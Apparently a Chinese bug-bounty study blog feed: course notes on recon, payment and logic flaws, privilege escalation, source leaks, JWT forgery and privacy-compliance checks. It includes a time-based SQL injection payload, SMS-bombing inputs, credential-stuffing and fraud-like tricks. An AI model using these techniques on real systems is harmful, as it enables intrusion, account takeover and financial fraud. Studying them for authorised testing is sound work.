title="寻找外包系统"></a>寻找外包系统</h2><p>以邮储银行为例，对目标进行命名分析：</p><ol><li>中国邮政储蓄银行</li><li>邮储银行</li><li>邮储</li><li>邮政储蓄银行</li><li>邮政储蓄</li><li>英文缩写：1、POSTAL SAVINGS BANK OF CHINA 2、psbc</li><li>中文缩写：1、 youchu 2、ycyh 3、yzcxyh 4、yzcx</li></ol><p>语法：</p><ol><li>title</li><li>domain</li><li>body</li></ol><h2 id="hunter使用技巧"><a href="#hunter使用技巧" class="headerlink" title="hunter使用技巧"></a>hunter使用技巧</h2><ol><li>默认列出一个月，改为一年</li><li>有些没有站点标题的也要点进去看，可能有东西</li><li>有些时候可以排除香港台湾</li><li>筛选出国家可获得更精准数据</li><li>可从域名排名和icon排名排除掉大量目标外的站点</li><li>使用此语法可快速模糊搜索出邮储的外包系统: <code>domain=&quot;psbc&quot; and domain!=&quot;psbc.com&quot;</code></li></ol><h2 id="基于调用hunter和fofa，省去了点击IP的步骤-小工具"><a href="#基于调用hunter和fofa，省去了点击IP的步骤-小工具" class="headerlink" title="基于调用hunter和fofa，省去了点击IP的步骤 小工具"></a>基于调用hunter和fofa，省去了点击IP的步骤 小工具</h2><p><code>https://github.com/0x727/Space_view</code></p><h2 id="指纹识别快速getshell"><a href="#指纹识别快速getshell" class="headerlink" title="指纹识别快速getshell"></a>指纹识别快速getshell</h2><p>使用语法搜索-导出下载-指纹识别-过滤<br>指纹识别: <code>https://github.com/0x727/ObserverWard</code><br>命令: <code>observer_ward.exe -f dom.txt -c dom.csv</code></p><h1 id="订单-支付漏洞"><a href="#订单-支付漏洞" class="headerlink" title="订单-支付漏洞"></a>订单-支付漏洞</h1><ol><li>订单id与账号没有绑定，替换订单id购买便宜内容</li><li>订单无过期，生成多个订单</li><li>在订单id中找到订单价格为0的订单id，替换购买，无支付页面显示，直接完成订单</li></ol><h1 id="注册漏洞"><a href="#注册漏洞" class="headerlink" title="注册漏洞"></a>注册漏洞</h1><p>场景：<br>企业注册<br>需要填写企业名称，统一信用代码，手机号，登录密码，确认密码，图形验证码，短信验证码。</p><p>在网上随便找一家公司，填入企业名称和统一信用代码，手机号和密码自己填。登录进入后是一个企业内部账号，手机号不是自己的。</p><h1 id="利用加密越权"><a href="#利用加密越权" class="headerlink" title="利用加密越权"></a>利用加密越权</h1><p>场景：<br>请求包和返回包中都有vendorCode，请求包的是加密的，返回包的是解密的。<br>有上传附件功能，在请求包中有fileRelatId，发现fileRelatId和vendorCode加密很像</p><p>利用方式：利用fileRelatId，在返回包中找到未加密的fileRelatId，将其改为自己想加密的内容，然后加密出自己想要的vendorCode。</p><h1 id="隐藏参数越权"><a href="#隐藏参数越权" class="headerlink" title="隐藏参数越权"></a>隐藏参数越权</h1><p>场景：<br>注册，抓包，有userId, mobile等各种注册信息。</p><p>利用方式：将uid置空，出现隐藏参数。返回包显示“uid，mobile和userid不能同时为空”。由于请求包中无mobile参数，于是将请求包中的uid参数删除，改为mobile参数，手机号使用企业内部手机号。</p><p>因为公司内部手机号是批量给员工发的，所以对员工手机号的后3位进行爆破。得到大量注册信息。</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>发现url中存在ueditor，利用nday找到编辑器漏洞SSRF即可。</p><h1 id="隐藏接口越权"><a href="#隐藏接口越权" class="headerlink" title="隐藏接口越权"></a>隐藏接口越权</h1><p>使用findsomething<br>找到空页面，抓包发现有查询字段，查询接口可以使用，即可越权。</p><h1 id="凌风云百度网盘"><a href="#凌风云百度网盘" class="headerlink" title="凌风云百度网盘"></a>凌风云百度网盘</h1><p>搜索出信息泄露，比如: 京东 合同，小米 合同<br>修复建议：以官方身份给百度网盘发邮件，删除内容。</p><h1 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h1><p>最后再测，以免手机号废掉。<br>payload：抓包在手机号后面加“,1” “+” 之类的。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_cource_15</title>
    <link href="http://example.com/2023/12/22/SRC_cource_15/"/>
    <id>http://example.com/2023/12/22/SRC_cource_15/</id>
    <published>2023-12-21T16:00:00.000Z</published>
    <updated>2023-12-25T08:57:00.591Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学员0-1分享课程。从中汲取一点新东西。</p><span id="more"></span><h1 id="2022-6-4"><a href="#2022-6-4" class="headerlink" title="2022.6.4"></a>2022.6.4</h1><h2 id="信息泄露方面"><a href="#信息泄露方面" class="headerlink" title="信息泄露方面"></a>信息泄露方面</h2><ol><li><p>google hack<br>site:<br>filetype:<br>intext:</p></li><li><p>.git泄露<br>githack.py<br>地址：<br><code>https://github.com/lijiejie/GitHack</code><br>使用方法：<br><code>GitHack.py http://www.openssl.org/.git/</code></p></li><li><p>svn泄露subversion源码管理工具<br>.svn&#x2F;entries<br>直接在后面加上上面的东西<br>或者用下面的工具<br><code>https://github.com/admintony/svnExploit</code></p></li><li><p>spring（大多不收）<br>spring接口泄露</p></li><li><p>.bashrc个人配置记录<br>&#x2F;.ssh&#x2F;authorized–keys<br>&#x2F;.bash–history<br>泄露站点服务器j记录</p></li><li><p>sql报错语句泄露</p></li><li><p>xray（谨慎使用）</p></li><li><p>dirsearch</p></li><li><p>测试环境漏洞挖掘<br>公告给的</p></li><li><p>威胁情报获取<br>工具搜<br><code>https://www.lingfengyun.com/</code><br>合同<br>设计图纸<br>身份证<br>通讯录<br>搜索引擎搜<br>疑似被黑赌博信息</p></li><li><p>DS_store (mac生产文件的位置信息可以用dirsearch找到这个漏洞通过工具python2下载源码)<br><code>https://github.com/lijiejie/ds_store_exp</code><br>druid未授权访问（阿里数据库连接池）<br>未授权访问路径<br>html:<br>ip&#x2F;druid&#x2F;index.html</p></li></ol><p>##Druid sql监控页面<br>ip&#x2F;druid&#x2F;weburi.html<br>##Druid Web URI监控页面<br>ip&#x2F;druid&#x2F;websession.html<br>##Druid Web Session监控页面<br>json:<br>ip&#x2F;druid&#x2F;weburi.json<br>##Druid Web URI json<br>ip&#x2F;druid&#x2F;websession.json<br>##Druid Web Session json<br>Druid 登录接口：<br>ip&#x2F;druid&#x2F;login.html<br>##Druid登录认证页面</p><p>谷歌语法查询<br>site:xx.com intitle:Druid Stat Index</p><h2 id="登录口"><a href="#登录口" class="headerlink" title="登录口"></a>登录口</h2><ol><li><p>万能密码<br>F12看返回包有没有<br>js中看路径可不可以拼接<br>xhr和xml中有没有存取密码</p></li><li><p>代码审计<br>信息泄露的源代码<br>git<br>svn</p></li><li><p>nday攻击<br>CMS识别<br>看框架打<br>spring<br>struct<br>看返回包里面的</p></li><li><p>撞库<br>手机号撞库<br>账号密码撞库<br>社工库撞库</p></li><li><p>暴力破解用户名密码<br>可爆破多次也算漏洞<br>注册验证已存在账号<br>用户名密码错误<br>通过注册验证出已注册<br>再进行爆破</p></li><li><p>账号权限绕过<br>改参数绕过<br>未授权拼接js绕过</p></li><li><p>验证码爆破和绕过<br>有直接回显<br>可重用验证</p></li><li><p>注入<br>sql注入<br>get参数注入<br>post注入<br>html注入</p></li><li><p>信息泄露或未授权<br>js拼接<br>getsomething</p></li><li><p>目录扫描<br>DDOS<br>验证码图片DDOS</p></li></ol><h2 id="深入业务"><a href="#深入业务" class="headerlink" title="深入业务"></a>深入业务</h2><ol><li>网站业务线流程梳理，搞清楚业务线之间的联系</li><li>跳出用户视角</li></ol><h2 id="新姿势分享"><a href="#新姿势分享" class="headerlink" title="新姿势分享"></a>新姿势分享</h2><ol><li>密保密码找回场景<br>抓包，直接删除POST内容</li></ol><h1 id="2022-6-11"><a href="#2022-6-11" class="headerlink" title="2022.6.11"></a>2022.6.11</h1><h2 id="反向并发"><a href="#反向并发" class="headerlink" title="反向并发"></a>反向并发</h2><p>挖掘并发漏洞时，不一定要让点赞增加，可以让点赞减少。</p><h2 id="危害角度转变"><a href="#危害角度转变" class="headerlink" title="危害角度转变"></a>危害角度转变</h2><p>场景：看广告视频，每次能获得100金币，每天最多能看10次广告。<br>操作：同时并发10次看广告视频，减少看广告视频的时间获得1000金币。（只能并发10次）<br>危害：减少看广告，减少广告商的流量，导致广告商不再此平台投放广告，造成平台广告收入数十万到数百万的损失。（中危）</p><h2 id="绕过关注限制发图片"><a href="#绕过关注限制发图片" class="headerlink" title="绕过关注限制发图片"></a>绕过关注限制发图片</h2><p>场景：聊天框中需要互相关注才能使用图片&#x2F;拍照功能，如果判断没有互相关注，则无法发送。<br>操作：抓包修改参数isFollowing从False改为True。<br>危害：批量打广告，骚扰用户。</p><h2 id="突破购买限制达到锁定库存的目的"><a href="#突破购买限制达到锁定库存的目的" class="headerlink" title="突破购买限制达到锁定库存的目的"></a>突破购买限制达到锁定库存的目的</h2><p>场景：A商品一个用户只能买50个，库存最大数量为996个。<br>操作：提交订单时，将数量修改为996个。达到持续锁定库存的目的。<br>危害：通过提交订单锁定库存，其他人无法购买，导致商家经营遭受损失。</p><h1 id="2022-6-25"><a href="#2022-6-25" class="headerlink" title="2022.6.25"></a>2022.6.25</h1><ol><li><p>半价购买<br>场景：购买云产品。<br>操作：将数量修改为0.5，达到半价购买目的。</p></li><li><p>币种替换<br>场景：原本是按USD购买，参数为priceUSD<br>操作：将priceUSD改为priceCNY，替换币种减少金钱。</p></li><li><p>修改赠送物品<br>场景：购买一件A商品后，赠送了B，C物品。<br>操作：将B，C物品的数量参数增大。结果获得更多物品。</p></li><li><p>0元购的修改点<br>在一个类似于淘宝的电商环境中，首先尝试在加入购物车时抓包修改数量参数，然后尝试在购物车中修改数量的位置抓包修改数量参数，最后尝试在提交订单时抓包修改数量参数。也即每个点都要进行测试。</p></li><li><p>手机号修改<br>在手机号前面加0，加+，或者进行编码等等。</p></li><li><p>变相0元购<br>场景：余额有3元，可提现但是通过人工审核。<br>操作：先提现，在人工审核期间赶紧把钱花光。最后达到既提现又花钱的目的。</p></li><li><p>更改url达到0元购目的<br>场景：购买一件带时间限制的产品，url中存在参数sixmonths, years等时间参数。<br>操作：购买years时间的产品，实际更改为sixmonths，达到0元购目的。原因是后面藏了时间参数标价为0</p></li><li><p>免费抽奖<br>场景：下单购买一件商品，赠送一次抽奖活动。<br>操作：购买商品后抽奖，再进行退货。获得免费抽奖的目的。</p></li><li><p>假漏洞也要提交<br>假漏洞即指的无实际危害的漏洞。比如下单购买一件商品，修改参数后价格为0元，但是实际无法支付，这个就是假漏洞。<br>提交后仍有可能通过。</p></li><li><p>同一接口不同价格<br>有的网站在不同页面使用同一接口充值，但是A方式和B方式价格不同，或是相同价格下数量不同。逻辑不一致。</p></li></ol><h1 id="2022-8-18"><a href="#2022-8-18" class="headerlink" title="2022.8.18"></a>2022.8.18</h1><ol><li>优惠券可遍历<br>场景：在电商平台中，分为两种优惠券，一种是平台发放的优惠券，一种是商家发放优惠券。具体参数示例如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;extensions&quot;:&#123;</span><br><span class="line">&quot;CHOOSE_PLATFORM_VOUCHER_ID&quot;:&quot;102220604141051000000&quot;,</span><br><span class="line">&quot;_platformVoucherParams&quot;:&#123;</span><br><span class="line">&quot;alias&quot;:&quot;270p8xgtullsloj&quot;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>操作：其中，CHOOSE参数可以遍历，观察可知是以时间发放的优惠券，那么可以造成注册商家后无限使用平台优惠券达到薅羊毛的行为。</li></ol><h1 id="2022-10-22"><a href="#2022-10-22" class="headerlink" title="2022.10.22"></a>2022.10.22</h1><h2 id="验证码加参数"><a href="#验证码加参数" class="headerlink" title="验证码加参数"></a>验证码加参数</h2><p>height&#x3D;1111<br>h&#x3D;1111<br>size&#x3D;1111<br>margin&#x3D;1111</p><h1 id="2022-11-6"><a href="#2022-11-6" class="headerlink" title="2022.11.6"></a>2022.11.6</h1><h2 id="挖洞小思路"><a href="#挖洞小思路" class="headerlink" title="挖洞小思路"></a>挖洞小思路</h2><p>挖SRC的时候，在一个站挖出了一些常规漏洞，可以将该站的favicon.ico保存下来，丢到fofa中，然后刷一遍，增加额外收获。</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>注入不一定都在小型src，某些大公司的src也有注入，src的注入payload也不一定很难。有些简单的payload都能直接达到效果，可以试试，不一定在边缘域名，主站也可能存在。</p><ol><li>手挖</li><li>用payload（高频: 0%27XOR(if(now()&#x3D;sysdate()%2Csleep(3)%2C0))XOR%27Z ）</li><li>使用扫描器（少用）</li></ol><p>常出现的：报错注入，时间盲注，get和post都有，数据包(Referer)里。</p><p>burp插件推荐：<code>https://github.com/smxiazi/xia_sql</code></p><p>注意：</p><ol><li>SQL注入能够看到库名即可提交。</li><li>如果有dba权限，可以直接提升漏洞等级。</li></ol><p>发现sql注入后常用的注入语句：<br><code>if((length(database())=8),5,0)</code><br><code>if((mid(database(),1,1)=&#39;y&#39;),5,0)</code><br><code>if(ord(substr(database(),1,1))&gt;120,5,0)</code></p><p>测试是否存在SQL注入的方式：<br>在参数位置1’  1&#x2F;0  @@  1&#x2F;1</p><p>代理IP池：爱加速</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学员0-1分享课程。从中汲取一点新东西。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_13</title>
    <link href="http://example.com/2023/12/19/SRC_course_13/"/>
    <id>http://example.com/2023/12/19/SRC_course_13/</id>
    <published>2023-12-18T16:00:00.000Z</published>
    <updated>2023-12-20T11:18:42.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>隐私合规漏洞第1,2课。</p><span id="more"></span><h1 id="隐私政策"><a href="#隐私政策" class="headerlink" title="隐私政策"></a>隐私政策</h1><p>隐私政策是独立于用户协议的，需要公开APP所有处理规则和基本情况，包括开办主体的基本信息，APP对个人信息收集、使用、共享及披露开办主体的基本信息，APP对个人信息收集、使用、共享及披露的基本情况，用户对于处理自己信息的基本权利，包括查看（无隐私政策或隐私政策无法打开的APP）、删除（能否撤销授权或删除个人相关信息，如地址，身份证等）、注销（能否注销账号）、投诉等以及政策发布、生效或更新日期。</p><p>隐私政策描述的情况也需要符合APP实际情形，例如隐私政策中对于注销、投诉提供的操作方法，需与APP内实际操作路径相一致。（不一致即可提交，最高到严重）</p><p>另外，对于业务开展目标用户为14周岁以下的儿童，需要有专门的儿童个人信息保护规则。过世人员也需留意。</p><h1 id="等级判定"><a href="#等级判定" class="headerlink" title="等级判定"></a>等级判定</h1><p>首先按企业的评分标准，如果在评分标准中未说明，自评高危即可。</p><h1 id="隐私合规漏洞参考标准"><a href="#隐私合规漏洞参考标准" class="headerlink" title="隐私合规漏洞参考标准"></a>隐私合规漏洞参考标准</h1><ol><li>关于印发《App违法违规收集使用个人信息行为认定方法》的通知</li><li>关于印发《常见类型移动互联网应用程序必要个人信息范围规定》的通知</li><li>工业和信息化部关于k开展纵深推进App侵害用户权益专项整治行动的通知</li><li>个人信息安全规范</li><li>App收集使用个人信息最小必要评估规范</li><li>《中华人民共和国个人信息保护法》</li></ol><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h2 id="用户默认同意隐私政策—违规"><a href="#用户默认同意隐私政策—违规" class="headerlink" title="用户默认同意隐私政策—违规"></a>用户默认同意隐私政策—违规</h2><ol><li>App首次运行</li><li>注册&#x2F;登录环节</li><li>收集使用个人信息的目的、方式、范围发生变化时</li><li>现版本没有主动提醒的（即使文本内容不变）</li></ol><p>弹窗内简要说明《隐私政策》要点</p><ol><li>点击跳转《隐私政策》详情页面</li><li>给予用户2个选择，同意或拒绝。在用户点同意之前，禁止任何的数据收集；用户选择拒绝后，可提示即将退出app（点拒绝直接退出违规，二次确认不违规）</li></ol><p>“注册即同意《用户协议》和《隐私政策》”，如果该方框默认勾上，则违规。<br>此方框需要用户勾选。</p><p>在注册登录环节需要再次提醒用户查看，一般会采用勾选框等形式。也要确保用户进入App后能随时查看隐私政策，一般要求在4次以内点击就能阅读到。所有地方的隐私政策内容需保持一致。</p><h2 id="用户默认同意隐私政策报告—示例（需最新版本）"><a href="#用户默认同意隐私政策报告—示例（需最新版本）" class="headerlink" title="用户默认同意隐私政策报告—示例（需最新版本）"></a>用户默认同意隐私政策报告—示例（需最新版本）</h2><p>标题：xx app 1.1.1版本存在默认用户同意隐私政策漏洞<br>内容：<br>在小米官方商店，下载 xx app最新版，版本xxx<br>打开app，输入手机号注册，发现左下角默认同意了该隐私政策</p><p>【图片证据】</p><p>此行为违反了xx规定的第x条</p><p>修复建议：<br>这个勾选应该由用户自己勾选，并非系统默认代替用户点击同意。</p><h2 id="收集手机号（不挖）"><a href="#收集手机号（不挖）" class="headerlink" title="收集手机号（不挖）"></a>收集手机号（不挖）</h2><p>并不是所有的功能都需要手机号实名。</p><h2 id="用户拒绝提供不必要的信息直接退出app—违规"><a href="#用户拒绝提供不必要的信息直接退出app—违规" class="headerlink" title="用户拒绝提供不必要的信息直接退出app—违规"></a>用户拒绝提供不必要的信息直接退出app—违规</h2><p>用户注册过程所收集的信息应遵循最小必要信息相关要求，当用户拒绝提供非最小必要信息或用户拒绝最小必要权限列表以外的权限时，是不能影响继续注册或使用基本功能服务。当然相对于基本信息外的其它附加功能，也是可以根据产品定位收集额外用户信息。</p><h2 id="注销功能"><a href="#注销功能" class="headerlink" title="注销功能"></a>注销功能</h2><p>有注册功能就对应要有注销功能。<br>App要提供有效并且简单易操作的账号注销功能，同时注销条件限制合理。<br>合理的方式：如注销提供条件不能多于注册时的条件。使用联合登录方式的账号注销，仅应解除关联或匿名化处理本app内账号关联信息。</p><h2 id="权限获取要求"><a href="#权限获取要求" class="headerlink" title="权限获取要求"></a>权限获取要求</h2><ol><li><p>目的声明<br>发起权限申请前，应以弹窗形式提前说明申请权限的场景，目的，将会收集的信息。</p></li><li><p>用户交互<br>若用户同意授权，开始收集对应权限的信息或行使对应权限功能。</p></li><li><p>若用户拒绝授权，则提供一个静态页面说明申请权限的理由引导用户授权。当用户再次主动使用所需权限对应的功能时，触发弹窗申请。否则弹窗申请频率不能低于48小时一次。</p></li></ol><h2 id="APP申请权限"><a href="#APP申请权限" class="headerlink" title="APP申请权限"></a>APP申请权限</h2><ol><li>场景化申请</li><li>申请敏感权限需要向用户明示收集使用的目的和用途。</li><li>敏感权限为可收集个人信息的权限，举例如下：<br>ios系统：IDFA，定位，通讯录，日历，提醒事项，照片，麦克风，相机，健康<br>Android系统：定位，通讯录，日历，存储，相机，麦克风，电话，短信，应用安装列表，身体传感器。</li><li>具体实现可采用弹框，占位页等形式进行说明申请权限的理由。在APP使用中，若用户明确拒绝授权，则不能频繁申请权限。不频繁的申请频率应为超过48小时再次申请。</li></ol><h2 id="身份证号"><a href="#身份证号" class="headerlink" title="身份证号"></a>身份证号</h2><p>实名认证若涉及到人脸识别，需单独告知用户收集使用的方式，目的，范围以及存储时间等。</p><h2 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h2><ol><li>应当有关闭“个性化推荐”的按钮，否则违规。</li><li>个人信息保护法中提到“通过自动化决策方式向个人进行信息…”</li><li>涉及到开屏广告，要确保能一键关闭，不可利用文字、整屏图片、视频等方式欺骗用户跳转，应当在广告内容中显著标明警示语，告知用户点击将跳转至第三方应用，确保用户知情。</li></ol><h2 id="用户投诉"><a href="#用户投诉" class="headerlink" title="用户投诉"></a>用户投诉</h2><p>涉及人工处理的，承诺处理时限应不超过15个工作日。否则违规。</p><h2 id="未成年人用户管理和成年人用户需不同"><a href="#未成年人用户管理和成年人用户需不同" class="headerlink" title="未成年人用户管理和成年人用户需不同"></a>未成年人用户管理和成年人用户需不同</h2><ol><li>未成年和成年管理应有不同。</li><li>需设置青少年模式。</li></ol><h2 id="接入SDK服务的注意事项（初学不建议，需会移动安全抓包）"><a href="#接入SDK服务的注意事项（初学不建议，需会移动安全抓包）" class="headerlink" title="接入SDK服务的注意事项（初学不建议，需会移动安全抓包）"></a>接入SDK服务的注意事项（初学不建议，需会移动安全抓包）</h2><p>SDK的合理合规配置。</p><h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><p>小程序合规和APP基本一致</p><h2 id="小米手机检测自启动跟用户程序检索"><a href="#小米手机检测自启动跟用户程序检索" class="headerlink" title="小米手机检测自启动跟用户程序检索"></a>小米手机检测自启动跟用户程序检索</h2><p>使用小米的应用行为记录。确保用户信息。</p><h2 id="收隐私合规漏洞的企业"><a href="#收隐私合规漏洞的企业" class="headerlink" title="收隐私合规漏洞的企业"></a>收隐私合规漏洞的企业</h2><p>途虎，麦当劳，爱奇艺，小米，金山</p><h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2><ol><li><p>爱奇艺标准：<br>低危：30-50<br>中危：100-300<br>高危：400-600</p></li><li><p>小米标准<br>高危漏洞：300-500（贡献币）<br>中危漏洞：80-120（贡献币）<br>低危漏洞：10-30（贡献币）<br>注：1贡献币&#x3D;10元</p></li></ol><h1 id="隐私合规第2课"><a href="#隐私合规第2课" class="headerlink" title="隐私合规第2课"></a>隐私合规第2课</h1><h2 id="申请相机权限未告知用户目的"><a href="#申请相机权限未告知用户目的" class="headerlink" title="申请相机权限未告知用户目的"></a>申请相机权限未告知用户目的</h2><p>违反了191号文件《App违法违规收集使用个人信息行为认定方法》中第二类第3条</p><p>修复建议：应该在动态申请相机权限时说明使用该权限的目的，例如：用于扫码登录，拍照上传头像等，根据实际业务来写。</p><h2 id="首次运行未经用户阅读并同意隐私政策，申请获取位置权限"><a href="#首次运行未经用户阅读并同意隐私政策，申请获取位置权限" class="headerlink" title="首次运行未经用户阅读并同意隐私政策，申请获取位置权限"></a>首次运行未经用户阅读并同意隐私政策，申请获取位置权限</h2><h2 id="登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则"><a href="#登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则" class="headerlink" title="登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则"></a>登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则</h2><h2 id="打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策"><a href="#打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策" class="headerlink" title="打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策"></a>打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策</h2><h2 id="测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规"><a href="#测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规" class="headerlink" title="测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规"></a>测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规</h2><p>首次APP打开还未登录就开始在后台收集应用程序列表</p><h2 id="个人隐私政策中出现错别字"><a href="#个人隐私政策中出现错别字" class="headerlink" title="个人隐私政策中出现错别字"></a>个人隐私政策中出现错别字</h2><h2 id="小程序未提供有效注销用户账号功能"><a href="#小程序未提供有效注销用户账号功能" class="headerlink" title="小程序未提供有效注销用户账号功能"></a>小程序未提供有效注销用户账号功能</h2><h2 id="强制收集用户联系方式（与隐私政策描述不符）"><a href="#强制收集用户联系方式（与隐私政策描述不符）" class="headerlink" title="强制收集用户联系方式（与隐私政策描述不符）"></a>强制收集用户联系方式（与隐私政策描述不符）</h2><h2 id="字体加粗"><a href="#字体加粗" class="headerlink" title="字体加粗"></a>字体加粗</h2><p>未对重点信息加粗</p><h2 id="无法访问隐私政策"><a href="#无法访问隐私政策" class="headerlink" title="无法访问隐私政策"></a>无法访问隐私政策</h2><h2 id="隐私合规测试清单"><a href="#隐私合规测试清单" class="headerlink" title="隐私合规测试清单"></a>隐私合规测试清单</h2><ol><li>隐私政策文本中未逐一列出App收集使用个人信息目的，类型，收集方式等内容。可制作表格清单，包括APP功能，权限，个人信息类型，目的。<br>共享个人信息和委托处理个人信息的第三方清单（包括嵌入的第三方代码，插件）至少需要在隐私政策中列出1、对外共享，转让，公开披露个人信息的目的2、涉及的个人信息类型3、接收方类型或身份</li><li>隐私政策文本中使用概述文字描述收集的个人信息类型。如：包括但不限于，例如，等</li><li>隐私政策未以单独成文的形式发布，作为用户协议、用户说明，或在其它文件中存在的个人信息保护相关条款文件中的一部分存在</li><li>隐私政策未说明app运营者的基本情况：公司名称，联系地址，个人信息保护联系方式</li><li>隐私政策中未明确政策更新日期</li><li>隐私政策文本中未显著标识个人敏感信息（字体加粗，标型号等）的，视为未对收集个人敏感信息进行充分告知</li><li>隐私政策文本中有关收集使用规则的内容晦涩难懂，冗长繁琐，让用户难以理解，如使用大量专业术语等。（不建议挖）</li><li>隐私政策，未对个人信息的查询，更新，删除，注销以及用户撤回已同意授权等操作方式进行明确说明。</li><li>隐私政策文本中未描述个人信息安全投诉，举报渠道。</li><li>举报渠道不可用，如果是总机电话为提供个人信息保护分机，热线电话未提供菜单键</li><li>未说明个人信息存储期限，超期处理方式</li><li>如使用定向推送，提升用户体验，用户画像等自动化决策功能，隐私政策文本中未明确说明关闭提供关闭选项。</li><li>如果存在个人信息出境，隐私政策文本中未将出境个人信息类型逐项列出并显著标识。若不存在个人信息出境情形也需说明。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;隐私合规漏洞第1,2课。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_12</title>
    <link href="http://example.com/2023/12/18/SRC_course_12/"/>
    <id>http://example.com/2023/12/18/SRC_course_12/</id>
    <published>2023-12-17T16:00:00.000Z</published>
    <updated>2023-12-18T06:31:02.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课内容主要是补充之前没讲到的。逻辑漏洞新课程第1节。</p><span id="more"></span><h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><p>定义: JWT全称json web token，是一种使用json为数据载体，通过对称与非对称对数据进行加密，可以保证数据输出的时候不修改，一般用于认证Authentication与授权Authorization<br>靶场: <code>https://github.com/h-a-c/jwt-lab</code><br>解密站点: <code>https://jwt.io</code><br>特征：以eyJ开头，以点号(.)分为三个部分的数据。</p><p>格式：<br>Header 声明算法及其它参数<br>payload 声明各种数据，明文传输，如id、user等<br>Signature对header和payloadj进行签名，签名方式在header</p><p>认证流程：</p><ol><li>登录 user&#x3D;abc&amp;pwd&#x3D;123 返回包：token&#x3D;[jwt内容]</li><li>Auth: eyJxxx.xxx.xxx user  (直接把jwt当作是cookie，修改jwt即可)</li></ol><p>案例1：</p><ol><li>修改签名算法：手动调整JWT的header，将算法改为none，构造后提交: {“alg”:”none”,”typ”:”JWT”}</li><li>删除签名：当服务端配置不当的时候，可能出现不校验JWT签名的场景。删除JWT的signature后服务器仍接收token，那么可以伪造任意身份了。</li></ol><p>案例2：</p><ol start="3"><li><p>报错导致泄露签名信息：JWT的payload不应包含任何敏感信息（如密码），如果base64 deacode后包含敏感信息，就可以加以利用。另类似CVE-2019-7644，在customErrors配置签名返回的报错信息包含正确签名</p></li><li><p>爆破密钥</p></li></ol><h1 id="session覆盖"><a href="#session覆盖" class="headerlink" title="session覆盖"></a>session覆盖</h1><p>案例1:<br>浏览器打开两个重置密码的网页，过程总共有3步：确认账号(自行输入账号)，安全验证，重置密码<br>第1个网页的账号是自己的，第2个网页的账号是别人的。<br>第1个网页的步骤来到第3步重置密码，输入新密码。<br>第2个网页在第1步确认账号，点击确定到下一步。<br>最后第1个网页点最后的确认，即可更改第2个网页账号的密码。</p><p>案例2：<br>抓包发现userId，更改后，返回包内容token部分发现jwt，再将jwt放在请求包替换，即可越权登录。</p><h1 id="支付漏洞的覆盖操作"><a href="#支付漏洞的覆盖操作" class="headerlink" title="支付漏洞的覆盖操作"></a>支付漏洞的覆盖操作</h1><p>场景：<br>一个平台有青铜会员和铂金会员两种。<br>一年：青铜会员33元，铂金会员45元。<br>一周：青铜会员1元，铂金会员2元。</p><p>操作方式：<br>先购买1年青铜会员，再购买1年铂金会员。结果铂金会员变成2年。或者先买1年青铜再买1周铂金，也是1年铂金。</p><h1 id="付费简历模板"><a href="#付费简历模板" class="headerlink" 